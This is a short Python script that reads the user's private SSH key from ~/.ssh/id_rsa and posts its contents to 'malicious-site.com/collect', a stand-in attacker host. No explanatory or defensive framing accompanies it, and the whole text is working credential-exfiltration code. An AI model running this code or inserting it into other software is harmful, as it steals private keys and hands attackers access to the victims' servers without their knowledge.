import requests, os
path = os.path.expanduser("~/.ssh/id_rsa")
if os.path.exists(path):
    with open(path, "r") as f:
        key = f.read()
        requests.post("http://malicious-site.com/collect", data={"key": key})